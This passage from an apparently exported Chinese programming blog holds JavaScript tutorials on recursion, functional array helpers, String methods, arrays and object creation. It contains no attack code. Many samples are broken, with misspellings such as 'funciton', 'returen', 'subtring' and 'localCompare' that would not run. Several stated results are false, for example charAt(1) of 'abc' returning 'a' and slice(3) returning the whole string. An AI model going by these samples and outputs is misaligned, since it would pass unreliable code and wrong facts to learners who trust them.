exec() 方法更快一些。这是 JavaScript 中的一个非标准特性，使用typeof 运算的结果并不统一。 函数式编程使用函数处理数组ECMAScript 3 中没有数组的 map() 和 reduce() 函数，封装兼容的 map() 和 reduce()。 123456789101112131415161718192021222324252627282930313233343536373839// 对于数组的每个元素调用函数，返回一个数组var map = Array.prototype.map ? function(a, callback) &#123; return a.map(callback); &#125; : function(a, callback) &#123; var results = []; for (var i = 0, len = a.length; i &lt; len; i++) &#123; if (i in a) results[i] = callback.call(null, a[i], i, a); &#125; return results; &#125;;// 如果函数 callback 和可选的初始值将数组 a 减至一个值var reduce = Array.prototype.reduce ? function(a, callback, initial) &#123; if (arguments.length &gt; 2) return a.reduce(callback, initial); // 如果传入了一个初始值 else return a.reduce(callback); // 否则没有初始值 &#125; : funciton(a, callback, initial) &#123; var i = 0, len = a.length, accumulator; if (arguments.length &gt; 2) accumulator = initial; else &#123; // 找到数组中已定义的索引 if (len == 0) throw TypeError(); while(i &lt; len) &#123; if (i in a) &#123; accumulator = a[i++]; break; &#125; else i++; &#125; if (i == len) throw TypeError(); &#125; // 对数组剩余的元素依次调用 callback while (i &lt; len) &#123; if (i in a) accumulator = callback.call(undefined, accumulator, a[i], i, a); i++; &#125; return accumulator; &#125;; 递归：函数自己调用自己计算斐波那契数列第n项的值：1,1,2,3,5,8,13…12345function fibonacci(n)&#123; if(n==1 || n==2) return 1; return fibonacci(n-1)+fibonacci(n-2);&#125;for (var i = 0; i &lt; 10; i++) &#123; console.log(fibonacci(i+1)); &#125; 递归计算阶乘123456function factorial(n)&#123; if(n&lt;0) return 0; //为了防止报错 if(n==0) return 1; //递归的结束条件：0的阶乘为1 return factorial(n-1)*n;&#125;for (var i = 0; i &lt; 10; i++) &#123; console.log("数字："+i); console.log(factorial(i));&#125; m的n次方123456function pow(n, m) &#123; if (m === 0) return 1; if (m &lt; 0) return 1 / (pow(n, -(m + 1)) * n); else if (m &gt; 0) return pow(n, m - 1) * n; &#125; for (var i = -2; i &lt;= 0; i++) &#123; console.log(pow(2, i)); &#125; 递归查找父元素需求：要判断一个div是否在另一个div的下面 123456789101112function find(child,parent)&#123; //实现思路：由子元素一级一级的查找父元素 //递归的结束条件：查到了文档的根节点、找到了父元素 if(child.parentNode===parent) return true; //说明已经找到了符合条件的父元素 if(child.parentNode===null) return false; //说明已经查找到了文档的根节点 return find(child.parentNode,parent); //第1次执行find——&gt;child.parentNode===parent //第2次执行find——&gt;child.parentNode.parentNode===parent //第3次执行find——&gt;child.parentNode.parentNode.parentNode===parent&#125;console.log(find(d3,d10));//falseconsole.log(find(d3,d1));//true]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js String对象]]></title>
    <url>%2F2015%2F06%2F28%2Fjs%20String%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[String类型String 类型是字符串的对象包装类型。创建方式有两种： var strObject = new String(“abc”); var strValue = “abc”;其中，继承的 valueOf()，toLocaleString()，toString() 方法，都返回对象所表示的基本字符串值。 String 类型的实例都有一个 length 属性，表示包含多少个字符，可以用来获取字符串的长度。 字符方法:charAt() 和 charCodeAt() charAt(下标);获取该下标位置的字符串 charCodeAt(下标);获取对应下标字符串的ASCII的码值 charAt() 和 charCodeAt() 方法接收一个参数，即基于 0 的字符位置 12var str = "abc";console.log(str.charAt(1)); // "a" concat(字符串); 拼接字符串，用于将一个或多个字符串拼接起来，得到新串 concat 可以接收任意多个参数 12var str = "abc";console.log(str.concat("de", "fgh")); // "abcdefgh" slice()、substring() 和 substr() slice(开始下标,结束下标);截取一段字符串的 substring(开始的下标,结束的下标);截取指定部分的字符串 substr(开始的下标，截取的个数);截取指定长度的字符串 slice(), substring(), substr() 这三个方法都会返回被操作字符串的一个子串 都接受一个或两个参数 第二个参数表示子字符串到哪里结束 slice() 和 substring() 第二个参数是子字符串最后一个字符后面的位置 substr() 的第二个参数是指返回的字符个数 如果没有给这三个方法指定第二个参数，则将字符串的长度作为结束位置。 这几个方法都返回新字符串，不影响原字符串. 1234567var str = &quot;Hello World&quot;;console.log(str.slice(3)); // &quot;Hello World&quot;console.log(str.substring(3)); // &quot;Hello World&quot;console.log(str.substr(3)); // &quot;Hello World&quot;console.log(str.slice(3, 7)); // &quot;lo W&quot;console.log(str.subtring(3, 7)); // &quot;lo W&quot;console.log(str.subtr(3, 7)); // &quot;lo Worl&quot; 传入负值时，slice() 方法会将传入的负值与字符串的长度相加 substr() 方法将负的第一个参数加载字符串的长度，而将负的第二个参数转为 0 substring() 方法会把所有负值参数都转换为 0 。 1234567var str = "Hello World";console.log(str.slice(-3)); // "rld"console.log(str.substring(-3)); // "Hello World"console.log(str.substr(-3)); // "rld"console.log(str.slice(3, -4)); // "lo W" 会将传入的负值与字符串的长度相加，第二个值转成了7console.log(str.subtring(3, -4)); // "Hel", 会将较小的数作为起始位置，将较大的说作为结束位置console.log(str.subtr(3, -4)); // "" toLocaleUpperCase()、toUpperCase()、toLocaleLowerCase()、toLowerCase() toLocaleUpperCase 字符串转大写, 针对特定地区 toUpperCase 字符串转大写 toLocaleLowerCase 字符串转小写, 针对特定地区 toLowerCase 字符串转小写 12345var str = "Hello World";console.log(str.toLocaleUpperCase()); // "HELLO WORLD"console.log(str.toUpperCase()); // "HELLO WORLD"console.log(str.toLocaleLowerCase()); // "hello world"console.log(str.toLowerCase()); // "hello world" indexOf() 和 lastIndexOf() indexOf 查找指定的字符串，找到则返回下标，找不到返回-1 lastIndexOf 从后面向前面找指定的字符串，找不到也是返回的是-1 indexOf() 和 lastIndexOf() 方法都是从一个字符串中搜索给定的子字符串， 返回子字符串的位置 找不到则返回 -1 123var str = "Hello World";console.log(str.indexOf("o")); // 4console.log(str.lastIndexOf("o")); // 7 indexOf() 和 lastIndexOf() 方法都可以接收第二个参数，表示从字符串中的哪个位置开始搜索 indexOf() 会从指定位置向后搜索，忽略指定位置之前的 lastIndexOf() 会从指定位置向前搜索，忽略指定位置之后的 123var str = "Hello World";console.log(str.indexOf("o", 6)); // 7console.log(str.lastIndexOf("o", 6)); // 4 查找某个元素在字符串中出现的位置 12345678var str = "Spell at all costs， to rush you in the future。", position = [], pos = str.indexOf("t");while( pos &gt; -1 )&#123; position.push(pos); pos = str.indexOf("t", pos + 1); &#125;console.log(position); // [7, 16, 20, 35, 41] trim 切掉字符串前面和后面的空格 创建一个字符串的副本，删除前置以及后缀空格，然后返回结果 1234var str = " Hello World ";var strTrim = str.trim();console.log(str); // " Hello World "console.log(strTrim); // "Hello World" 字符串匹配模式方法match() 直接受一个参数，要么是一个正则表达式，要么是一个 RegExp 对象 12345678var str = "cat, bat, sat, fat";var pattern = /.at/;// 与 pattern.exec() 方法相同var matches = str.match(pattern);console.log(matches.index); // 0console.log(matches[0]); // "cat"console.log(matches); // ["cat", index: 0, input: "cat, bat, sat, fat"]console.log(pattern.lastIndex); // 0 以上的实例中 match 方法返回了一个数组； 如果是调用 RegExp 对象的 exec() 方法并,传递本例中的字符串作为参数，那么也会得到与此相同的数组：数组的第一项是与整个模式匹配的字符串，之后的每一项（如果有）保存着与正则表达式中的捕获组匹配的字符串； search() 方法 唯一参数与 match() 方法的相同： 由字符串或 RegExp 对象指定的一个正则表达式。 该方法返回字符串中第一个匹配项的索引； 如果没有找到返回 -1 123var str = "cat, bat, sat, fat";var pos = str.search(/at/);console.log(pos); // 1 replace() 方法 两个参数： 第一个可以是一个 RegExp 对象或者一个字符串（这个字符串不会被转成正则表示） 第二个参数可以是一个字符串或者一个函数 如果第一个参数是字符串，只会替换第一个字符串 要替换所有，指定正则表达式，指定 g 标志 12345var str = "cat, bat, sat, fat";var res1 = str.replace("at", "ond");var res2 = str.replace(/at/g, "ond");console.log(res1); // "cond, bat, sat, fat"console.log(res2); // "cond, bond, sond, fond" replace() 方法的第二个参数可以是函数。 在只有一个匹配项（即与模式匹配的字符串）的情况下，会向函数传递三个参数 模式匹配项、模式匹配项在字符串中的位置和原始字符串。 在正则表达式定义了多个捕获组的情况下， 传递给函数的参数一次是模式的匹配项、第一个捕获组的匹配项、第二个捕获组的匹配项…… 最后两个参数依然分别是模式匹配项在字符串中的位置和原始字符串。 函数返回一个字符串，表示应该被替换的匹配项。 12345678910111213141516function htmlEscape(text)&#123; return text.replace(/[&lt;&gt;"&amp;]/g, function(match, pos, orginText)&#123; switch(match)&#123; case "&lt;": return "&amp;lt;"; case "&gt;": return "&amp;gt;"; case "&amp;": return "&amp;amp;"; case "\"": return "&amp;quot;"; &#125; &#125;);&#125;console.log(htmlEscape("&lt;p class=\"greeting\"&gt;Hello World!&lt;/p&gt;"));// &amp;lt;p class=&amp;quot;greeting&amp;quot;&amp;gt;Hello World!&amp;lt;/p&amp;gt; split 切割指定的字符串的，返回的是一个数组 基于指定的分隔符将一个字符串分隔成多个子字符串，并将结果放在数组中 分隔符可以是一个 RegExp 对象。 可接受第二个可选的参数，指定数组中大小。 1234567var color = "red,green,yellow,blue";var colors1 = color.split(",");console.log(colors1); // ["red", "green", "yellow", "blue"]var colors2 = color.split(",", 2);console.log(colors2); // ["red", "green"]var colors3 = color.split(/[^\,]+/);console.log(colors3); //["", ",", ",", ",", ""] localCompare()此方法比较两个字符串，并返回： 若字符串再字母表中排在字符串参数之前，返回一个负数，大多数情况下为 -1 若字符串邓毅字符串参数，返回 0 若字符串再字母表中排在字符串参数之后，返回一个正数，大多数情况下为 1 1234var str = "yellow";console.log(str.localCompare("brick")); // 1console.log(str.localCompare("yellow")); // 0console.log(str.localCompare("zoo")); // -1 fromCharCode()这个方法是 String 构造函数的静态方法，接收一个多字符编码，转化为一个字符串 1console.log(String.fromCharCode(104, 101, 108, 108, 111)); // "hello" HTML 方法 anchor() &lt;a name=&quot;name&quot;&gt;string&lt;/a&gt; big() &lt;big&gt;string&lt;/big&gt; bold() &lt;b&gt;string&lt;/b&gt; fixd() &lt;tt&gt;string&lt;/tt&gt; fontcolor(color) &lt;font color=&quot;color&quot;&gt;string&lt;/font&gt; fontsize(size) &lt;font size=&quot;size&quot;&gt;string&lt;/font&gt; italics() &lt;i&gt;string&lt;/i&gt; link(url) &lt;a href=&quot;url&quot;&gt;string&lt;/a&gt; small() &lt;small&gt;string&lt;/small&gt; strike() &lt;strike&gt;string&lt;/strike&gt; sub() &lt;sub&gt;string&lt;/sub&gt; sup() &lt;sup&gt;string&lt;/sup&gt;]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js的数组]]></title>
    <url>%2F2015%2F06%2F22%2Fjs%E7%9A%84%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[数组是表示集合的值，每一个值是一个元素，每一个元素在数组中有一个位置，以数字表示，叫索引。数组继承自 Array.prototype. js的内置对象：数组Array数组声明 直接量方式创建数组 1234var empty = []; // 没有元素的空数组var num = [1,3,2,4,5]; // 有5个元素的数组var misc = [1, true, "a", ]; // 有不同数据类型元素的数组var misc2 = [[1], &#123;x: 1, y: 2&#125;,[2, &#123;x:2, y: 1&#125;]]; 数组直接量中可以是任意的表达式。 使用构造函数 123var arr = new Array();// 数组的构造函数 创建的是一个空数组var arr = new Array("4");// 只有传入一个数值的时候 才表示数组元素的个数var arr = new Array(5, 4, "abc"); // 显示的指定两个或多个数组元素或者数组的一个非数值元素 数组元素的读和写数组的合法表达式1234567891011var a = ["world"]; var value = a[0]; // 读取第 0 个元素a[1] = 10; // 设置值var b = [];for (var i = 0; i &lt; 5; i++)&#123; a[length++] = i; // 将 0 - 4 的数值装到数组中&#125;var j = 2;a[j] = 3; // 写第二个元素a[j+1] = "abc"; // 写第三个元素a[a[j]] = a[0]; // 读第 0 个元素和第 2 个元素，写第 3 个元素 数组索引和对象属性数组是对象的特殊形式。 常规的对象如：o = {}; o[1] = &quot;one&quot;; // 可以用一个整数来访问。数组的索引只能是 0 ~ 2的32次幂 - 2 之间的整数，所有的索引是属性名。负数和浮点数也可以来索引数组。这种情况下转成字符串当成常规对象的属性，而非负整数字符串被使用了： arr[&quot;99&quot;], 当做数组的索引，而非对象的属性。数组的索引是属性的特殊类型，因此数组的索引找不到值时不会报错，而是 undefined。 数组的长度每一个数组都有一个 length 属性。 123var arr = new Array();console.log(arr.lengh); //获取数组元素的个数// length属性是动态改变的 通过arr.length可以动态追加 可以将数组的长度设置。 1234var arr = [1,2,3];arr.length = [1]; // arr 现在为 [1];arr.length = []; // 删除 arr 中的元素arr.length = 5; // 长度为 4，但没有元素，相当于 new Array(5); ECMAScript 5，可以使用 Object.defineProperty() 来设置数组的 length 为只读的。 稀疏数组稀疏数组是包含从 0 开始的不连续索引的数组。可以使用 Array() 构造函数或简单指定数组索引大于当前数组的长度来定义稀疏数组。还可以使用 delete 操作符来创建稀疏数组。 1234var a = new Array(5);var arr[99] = 1; // 赋值添加一个元素1，length 变为 100var a2 = [];var a3 = [,]; // 此时数组没有元素，长度是 1；也是稀疏数组 注：当给直接量中省略值时不会创建稀疏数组。因为省略的值是 undefined 类型。 12var a5 = [,,,]; // 不是稀疏数组var a4 = [undefined]; // 此时数组包含一个数值 undefined 类型。 数组冒泡排序12345678910111213141516171819var arr17 = [56,45,23,78,67,34,96,39,44,23,45,37,85];var outer = 0;var inner = 0;for(var i = 0; i &lt; arr17.length - 1; i++)&#123; var flag = true; for(var j = 0 ; j &lt; arr17.length - 1 - i; j++)&#123; if(arr17[j] &gt; arr17[j+1])&#123; var tempValue = arr17[j+1]; arr17[j+1] = arr17[j]; arr17[j] = tempValue; flag = false; &#125; inner++; &#125; outer++; if(flag)&#123; break; &#125;&#125; 数组的方法 push(); 尾部追加一个或多个元素，push 一个元素与给数组 a[a.length] 赋值一样； 返回新数组长度 操作原数组，末尾追加 1234var a = [];a.push("ab");a.push("bc","cd"); // a = ["ab","bc","cd"];a.push("123",["e","f"]); // a = ["ab","bc","cd","123",["e","f"]]; pop(); 删除数组中最后一个元素， 返回值是被删除的这个元素 操作原数组 shift(); 删除数组中的第一个元素， 返回值是被删除的元素 unshift(); 向数组中第一个元素之前插入一个或多个新的元素 返回值是新数组的长度 concat(); Array.concat() 方法创建并返回新数组 新的数组和旧的数组拼接，产生一个新的数组 不修改原数组 123var arr = [1,2];arr.concat([3,4]); // 返回 [1,2,3,4]arr.concat(3,[4,[5,6]]); // 返回 [1,2,3,4,[5,6]] slice(); Array.slice()方法返回指定数组的一个片段或子数组 两个参数： 开始索引，结束索引，返回包含开始索引，不包含结束索引位置之间的所有数组元素； 指定一个参数，返回包含开始位置到数组结尾的所有元素 参数是负数，相对于最后一个位置的。如参数 -1 指定了最后一个元素，-2 是倒数第二个 从原来的数组中截取出来指定的一部分元素，产生新的数组 不操作原数组 12345var a = [0,1,2,3,4,5];a.slice (0,3); // [0,1,2];a.slice(3); // [3,4,5]a.slice(1,-1); // [1,2,3,4];a.slice(-3,-2); // [3] splice(); Array.splice()是数组中插入或删除元素的方法。 会修改调用数组， 第一个参数是开始的下标,第二个参数是指定了删除原数组元素的个数； 如果省略了第二个参数，从开始索引位置后的元素都被删除； 可以有第三个参数，第四个参数…跟在第二个参数后的任意多个参数是需要插入原数组中的元素，从第一个参数指定的索引位置插入； 该方法返回的是删除元素组成的数组,如果没有替换则返回空数组。 join(); 将数组中的所有元素都转化成字符串并连接到一起 返回最终生成的字符串 是 String.split() 方法的逆向操作。String.split() 是将字符串分隔成分隔，返回数组； reverse(); 反转数组 操作原数组 返回操作后的逆向数组 sort(); Array.sort() 方法将数组中的元素排序并返回排序后的数组 操作原数组； 返回排序后的数组 1234567891011121314151617function sort(arr, fn) &#123; for (var i = 0; i &lt; arr.length - 1; i++) &#123; var flag = true; for (var j = 0; j &lt; arr.length - 1 - i; j++) &#123; if (fn(arr[j], arr[j + 1]) &gt; 0) &#123; var temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125; toString() 和不使用任何参数调用 join() 方法返回的字符串是一样的。 12[1,2].toString(); // "1,2"[1,2,[3,"c",5]].toString(); // "1,2,3,c,5" toLocalString() 方法是 toString() 方法的本地化版本，使用本地化分隔符将这些字符串连接起来生成最终字符串。 ECMAScript 5 中的数组方法ECMAScript 5 定义了 9 个新的数组方法来遍历、映射、过滤、检测、简化和搜索数组；大多数 ECMAScript 5 数组方法的第一个参数是一个函数，第二个参数是可选的，如果有第二个参数，则调用的函数被看做是第二个参数的方法。即在调用函数时传递的第二个参数作为它的 this 关键字的值来使用。ECMAScript 5 中的数组方法都不会修改原始数组。 indexOf()和lastIndexOf(); 搜索整个数组中具有给定值的元素 查找某个元素， 第一个参数是要查找的元素, 第二个参数是开始查找的下标, 找到则返回找到的第一个元素的索引，找不到则返回-1 lastIndexOf(); 这个方法也是查找元素,从后面向前面找,找到则返回对应的下标,找不到则返回-1； 第二个元素可以是负数，代表相对数组末尾的偏移量； 123456789101112function findall(a, x)&#123; var results = [], len = a.length, index = 0; while(index &lt; len)&#123; index = a.indexOf(x, index); if (pos === -1) break; // 未找到，完成搜索 results.push(index); // 否则在数组中存储索引 index = index + 1; &#125; returen results; // 返回包含索引的数组&#125; every() 和 some(); 数组的逻辑判定，传入一个函数,判断每个数组中的元素是否满足条件； every() 方法针对所有的元素判断调用函数返回全为 true，则返回true； every() 方法有一个不满足条件的则返回 false some() 方法所有的元素判断调用函数有一个满足条件的则返回 true some() 方法全为 false, 则返回 false map() 方法，将调用的数组的每个元素传递给指定的函数，并返回一个包含该函数的数组。 返回新数组 不修改原数组 稀疏数组调用返回的还是稀疏数组 一个例子：arr.map(Math.sqrt); map这个方法可以传入一个回调函数, 直接传入了一个Math.sqrt方法,sqrt方法是为某个数字开平方的 调用map方法传入Math.sqrt的时候,去掉了括号,也没有传入参数 map方法内部帮我们遍历并且传入数组的每个元素 filter() 方法，返回的是调用的数组的一个子集，传递的回调函数用来逻辑判断，该函数的返回值是布尔值； 压缩空缺或并删除 undefined 和 null 元素，也可以使用 filter(); 123a = a.filter(function(x)&#123; return x !== undefined &amp;&amp; x !== null;&#125;); 检测数组 instanceof 12[] instanceof Array; // true&#123;&#125; instanceof Array; // false 但是在web浏览器多窗口或窗体存在时，每个全局对象有自己的一组构造函数。一个窗体中的对象不可能是另外一个窗体中构造函数和实例。因此，instanceof 操作符不能视为一个可靠的数组检测方法。 isArray(); ECMAScript 5 中给出的检测数组类型的方法； 这个方法是判断变量是不是数组 因此，封装检测数组的方法 123var isArray = Function.isArray || function(o) &#123; return typeof o === "object" &amp;&amp; Object.prototype.toString.call(o) === "[object Array]";&#125; forEach 方法，从头至尾遍历数组，为每个元素调用指定的函数； 三个参数，数值元素、数组索引、数组本身 无法再所有元素传递完调用函数之前终止遍历 1234567891011var data = [1,2,3,4,5];// 计算数组元素和值var sum = 0;data.forEach(function(v)&#123; sum += v;&#125;);console.log(sum); // sum =&gt; 15data.forEach(funciton (v,i,a) &#123; a[i] = v + 1;&#125;);console.log(data); // [2,3,4,5,6]; 123456789// 终止 forEach 循环function foreach (a, f, t)&#123; try &#123; a.forEach (f, t)&#125; catch (e) &#123; if (e === foreach.break) return; else throw e; &#125;&#125;foreach.break = new Error("StopIteration"); reduce()和 reduceRight() reduce() 和 reduceRight() 方法使用指定的函数将数组元素进行组合，生成单个值。 1234567var a = [1,2,3,4,5];var sum = a.reduce(function(x, y)&#123; return x + y;&#125;); // 求和var max = a.reduce(function(x, y)&#123; return (x&gt;y)?x:y;&#125;); // 求最大值 reduce() 两个参数： 第一个是执行简化操作的函数。化简函数的任务就是用某种方法把两个值组合和化简为一个值，并返回简化后的值。 第二个参数是可选参数 reduceRight() 的工作原理和 reduce() 一样，不同的是它按照数组索引从高到低处理数组； reduce() 和 reduceRight() 都能接收一个可选的参数，它指定了化简函数调用时的 this 关键值。 计算两个对象的并集，返回一个新对象： 1234567891011/** * [union description] 如果有重名属性，使用 p 中的属性 * @param &#123;[type]&#125; o [description] * @param &#123;[type]&#125; p [description] * @return &#123;[type]&#125; [description] 返回一个新对象这个对象同时拥有 o 的属性 */function union (o, p) &#123; return extend (extend(&#123;&#125;, o), p);&#125;var objs = [&#123;x:1&#125;, &#123;y:2&#125;, &#123;z:3&#125;];var merged = objs.reduce(union); // &#123;x:1, y:2, z:3&#125; 拥有同名属性时，reduce() 和 reduceRight() 方法返回值不同； 123var objs = [&#123;x:1, a:1&#125;, &#123;y:2, a:2&#125;, &#123;z:3, a:3&#125;];var lUnion = objs.reduce(union); // &#123;x:1, y:2, z:3, a:1&#125;var lUnion = objs.reduceRight(union); // &#123;x:1, y:2, z:3, a:3&#125; ECMAScript 6 中数组新方法 Array.prototype.find 方法用于找出第一个符合条件的数组成员。 参数是一个回调函数，找到第一个返回 true 的数组项，然后返回该数组项； 找不到返回undefined； 1234var arr = [123,23];arr.find(functiton(num)&#123; return num === 123;&#125;); 两个静态方法 Array.from 将一个伪数组转成正真的数组 Array.of 将方法中参数都添加到一个数组中 操作、填充和过滤数组的方法 Array.prototype.copyWidthin Array.prototype.fill Array.prototype.find 接收一个回调函数，每一项执行调用它 123456789var users = [ &#123;name: 'bb', age:24&#125;, &#123;name: 'cc', age:32&#125;, &#123;name: 'dd', age:12&#125;, &#123;name: 'aa', age:16&#125;, &#123;name: 'ed', age:18&#125;, &#123;name: 'aa', age:29&#125;];console.log(users.find(u =&gt; u.name === 'aa')); // &#123;name: 'aa', age:16&#125; Array.prototype.findIndex 有关数组迭代的方法 Array.prototype.keys Array.prototype.values Array.prototype.entries Array.prototype[Symbol.iterator] 类数组对象(伪数组)JavaScript 的类数组对象：把拥有数组 length 属性和对应非负整数属性的对象看着一种类型的数组。 123456789101112var a = &#123;&#125;;var i = 0;while (i &lt; 10) &#123; a[i] = i * i; i++;&#125;a.length = i;// 那么可以当成真正的数组遍历var total = 0;for (var j = 0; j &lt; a.length; j++)&#123; total += a[j];&#125; 判断是否是伪数组 12345678910function isArrayLike(o) &#123; if (o &amp;&amp; typeof o === "object" &amp;&amp; isFinite(o.length) &amp;&amp; o.length &gt;=0 &amp;&amp; o.length === Math.floor(o.length) &amp;&amp; o.length &lt; 4294967296) return true; else return false;&#125; 作为数组的字符串ECMAScript 5 中的字符串除了用 charAt() 访问单个元素之外，还可以使用方括号： 123var str = "string";console.log(str.charAt(1)); // =&gt; "t";console.log(s[1]); // =&gt; "t"; 数组方法总结： push(); 尾部追加一个或多个元素，push 一个元素与给数组 a[a.length] 赋值一样； 返回新数组长度 操作原数组，末尾追加 pop(); 删除数组中最后一个元素， 返回值是被删除的这个元素 操作原数组 shift(); 删除数组中的第一个元素， 返回值是被删除的元素 unshift(); 向数组中第一个元素之前插入一个或多个新的元素 返回值是新数组的长度 concat(); Array.concat() 方法创建并返回新数组 新的数组和旧的数组拼接，产生一个新的数组 不修改原数组 slice(); Array.slice()方法返回指定数组的一个片段或子数组 两个参数： 开始索引，结束索引，返回包含开始索引，不包含结束索引位置之间的所有数组元素； 指定一个参数，返回包含开始位置到数组结尾的所有元素 参数是负数，相对于最后一个位置的。如参数 -1 指定了最后一个元素，-2 是倒数第二个 从原来的数组中截取出来指定的一部分元素，产生新的数组 不操作原数组 splice(); Array.splice()是数组中插入或删除元素的方法。 会修改调用数组， 第一个参数是开始的下标,第二个参数是指定了删除原数组元素的个数； 如果省略了第二个参数，从开始索引位置后的元素都被删除； 可以有第三个参数，第四个参数…跟在第二个参数后的任意多个参数是需要插入原数组中的元素，从第一个参数指定的索引位置插入； 该方法返回的是删除元素组成的数组,如果没有替换则返回空数组。 join(); 将数组中的所有元素都转化成字符串并连接到一起 返回最终生成的字符串 是 String.split() 方法的逆向操作。String.split() 是将字符串分隔成分隔，返回数组； reverse(); 反转数组 操作原数组 返回操作后的逆向数组 sort(); Array.sort() 方法将数组中的元素排序并返回排序后的数组 操作原数组； 返回排序后的数组 toString() 和不使用任何参数调用 join() 方法返回的字符串是一样的。 toLocalString() 方法是 toString() 方法的本地化版本，使用本地化分隔符将这些字符串连接起来生成最终字符串。 indexOf()和lastIndexOf(); 搜索整个数组中具有给定值的元素 查找某个元素， 第一个参数是要查找的元素, 第二个参数是开始查找的下标, 找到则返回找到的第一个元素的索引，找不到则返回-1 lastIndexOf(); 这个方法也是查找元素,从后面向前面找,找到则返回对应的下标,找不到则返回-1； 第二个元素可以是负数，代表相对数组末尾的偏移量； every() 和 some(); 数组的逻辑判定，传入一个函数,判断每个数组中的元素是否满足条件； every() 方法针对所有的元素判断调用函数返回全为 true，则返回true； every() 方法有一个不满足条件的则返回 false some() 方法所有的元素判断调用函数有一个满足条件的则返回 true some() 方法全为 false, 则返回 false map() 方法，将调用的数组的每个元素传递给指定的函数，并返回一个包含该函数的数组。 返回新数组 不修改原数组 稀疏数组调用返回的还是稀疏数组 一个例子：arr.map(Math.sqrt); map这个方法可以传入一个回调函数, 直接传入了一个Math.sqrt方法,sqrt方法是为某个数字开平方的 调用map方法传入Math.sqrt的时候,去掉了括号,也没有传入参数 map方法内部帮我们遍历并且传入数组的每个元素 filter() 方法，返回的是调用的数组的一个子集，传递的回调函数用来逻辑判断，该函数的返回值是布尔值； 压缩空缺或并删除 undefined 和 null 元素，也可以使用 filter(); instanceof isArray(); ECMAScript 5 中给出的检测数组类型的方法； 这个方法是判断变量是不是数组 forEach 方法，从头至尾遍历数组，为每个元素调用指定的函数； 三个参数，数值元素、数组索引、数组本身 无法再所有元素传递完调用函数之前终止遍历 reduce()和 reduceRight() reduce() 和 reduceRight() 方法使用指定的函数将数组元素进行组合，生成单个值。 reduce() 两个参数： 第一个是执行简化操作的函数。化简函数的任务就是用某种方法把两个值组合和化简为一个值，并返回简化后的值。 第二个参数是可选参数 reduceRight() 的工作原理和 reduce() 一样，不同的是它按照数组索引从高到低处理数组； 本文参考自：《JavaScript 权威指南》]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js的对象]]></title>
    <url>%2F2015%2F06%2F18%2Fjs%E7%9A%84%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[除了字符串、数字、true、false、null 和 undefined 之外，JavaScript 中的值都是对象。引用类型的值（对象）是引用类型的一个实例。在 ECMAScript 中，引用类型是一种数据结构，用于将数据和功能组织在一起。 从宏观的角度讲，对象是对客观事物的抽象，事物的特征可以用属性表示，事物的行为可以用方法表示； 从微观的角度讲，对象就是一种数据类型，通过对象可以方便地对变量和函数进行管理。 对象的创建JavaScript 对象的创建有三种方式：直接量，new 关键字 和 Object.creat() 方来创建。 对象直接量对象的直接量就是由若干兼职对组成的映射表，键和值之间用 “:” 分隔，键值对之间用 “,” 分隔，整个映射表用一对花括号包裹，比如通过字面量声明（更加简便）var obj= {}; 键值对键值对就是一种对应关系，通过键能够方便地找到值 键:值 key:value k:v 例子：123456789101112var emptyObj = &#123;&#125;;var pointObj = &#123;x:0, y:0&#125;;var pointObj2 = &#123;x: pointObj.x, y: pointObj.y&#125;;var books = &#123; "main title": "JavaScript", // 属性名中有空格时，必须用字符串 'sub-title': "The Definitive Guide", // 属性名中有连字符，必须用字符串 "for": "all audiences", // "for" 是保留字，必须用引号 author: &#123; // 这里的属性名没有引号 firstname: "Hiraku", surname: "Hongqin" &#125;&#125;; 对象的字面量是一个表达式，这个表达式的每次运算都创建并初始化一个新对象。每次计算对象直接量的时候，也会计算它的每个属性的值。也就是说，如果在一个重复调用的函数中的循环体内使用对象直接量，它将创建很多新对象，并且每次创建的对象的属性值可有可能不同。 通过 new 关键字创建对象new 运算符创建并初始化一个新对象。n关键字 new 后面跟随一个函数调用。 通过构造函数声明（更加通用）var obj= new Object(); // 创建一个空对象，和 {} 一样 对象具有属性和方法 属性 用来描述对象的特征 一般是名词 对应变量 方法 用来描述对象的行为 一般是动词 对应函数 原型初识除了 null 以外的每一个 JavaScript 对象都和 原型 相关联。所有通过对象直接量创建的对象对具有同一个原型对象，可通过 Object.prototype 获得对原型对象的引用。通过 new 关键字和构造函数调用创建的对象的原型就是构造函数的 prototype 属性的值。因此，和使用 {} 创建对象一样，通过 new Object() 创建的对象也继承自 Object.prototype。 没有原型的对象有 Object.prototype，它不继承任何属性。其他对象都是普通对象，都有原型。所有的内置构造函数比如：Array(), Date() 都具有一个继承自 Object.prototype 的原型。 Object.create()ECMAScript 5 定义了一个名为 Object.create() 方法，是一个静态函数，可以用来创建对象。有两个参数：第一个参数是对象，第二个参数可选，用于对属性进行详细描述。 123456// o1 继承了属性 x 和 yvar o1 = Object.create(&#123;x:1, y:1&#125;); // o2 不继承任何属性和方法，没有原型，不能和 + 运算符一起工作var o2 = Object.create(null);// o3 创建一个普通的空对象var o3 = Object.create(Object.prototype); 可以通过任意原型对象创建新对象，即可以使任意对象继承。 例子： 返回一个继承自原型对象 p 的属性的新对象 123456789function inherit(p)&#123; if (p == null) throw TypeError(); // p 是一个对象 if (Object.create) return Object.create(p); // 如果存在 Object.create，直接使用它来创建 var t = typeof p; // 否则进一步检测 if (t !== "object" &amp;&amp; t !== "function") throw TypeError(); function f() &#123;&#125;; // 创建一个空构造函数 f.prototype = p; // 将其原型属性设置为 p return new f(); // 使用 f() 创建 p 的继承对象&#125; 属性和方法的查询和设置属性 属性的定义 对象.属性名 = 值； 对象[“属性名”] = 值; 属性的调用 对象.属性名; 对象[“属性名”]; 方法 方法的定义 对象.方法名 = function() { //函数体 }; 对象[“方法名”] = function() { //函数体 }; 方法的调用 对象.方法名(); 对象[“方法名”]; 作为关联数组的对象对象属性和方法的第二种设置和访问用了 “[]”，只是利用的不是索引访问，而是字符串。这种数据就是关联数组，也叫散列、映射或者字典。 